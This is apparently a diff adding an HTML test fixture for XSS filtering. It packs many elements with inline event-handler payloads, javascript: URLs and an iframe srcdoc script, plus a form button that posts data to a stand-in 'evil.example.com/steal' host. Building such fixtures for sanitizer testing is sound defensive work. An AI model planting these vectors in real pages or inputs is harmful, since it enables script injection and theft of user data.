@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>XSS via attributes</title>
+</head>
+<body onload="alert('body')">
+  <section class="hero" onclick="alert(1)" onmouseover="alert(2)">
+    <h1 onfocus="alert(3)" tabindex="0">Event handlers everywhere</h1>
+    <img src="https://cdn.example.com/hero.png" alt="Hero" onerror="alert(4)" OnLoad="alert(5)">
+    <img src="x" alt="broken" onerror=alert(6)>
+    <p ONCLICK="alert(7)" on-custom="alert(8)">Paragraph with handlers</p>
+    <div style="color: red" onpointerdown="alert(9)" onanimationstart="alert(10)">Styled div</div>
+    <form action="https://site.example.com/subscribe" method="post" onsubmit="alert(11)">
+      <input type="email" name="email" placeholder="Email" onfocus="alert(12)" autofocus>
+      <button type="submit" formaction="javascript:alert(13)">Subscribe</button>
+      <input type="submit" formaction="https://evil.example.com/steal" value="Go">
+    </form>
+    <iframe srcdoc="&lt;script&gt;alert(14)&lt;/script&gt;" src="https://www.youtube.com/embed/abc"></iframe>
+    <details open ontoggle="alert(15)"><summary>More</summary>Hidden content</details>
+    <video src="https://cdn.example.com/a.mp4" poster="javascript:alert(16)" onplay="alert(17)"></video>
+  </section>
+</body>
+</html>
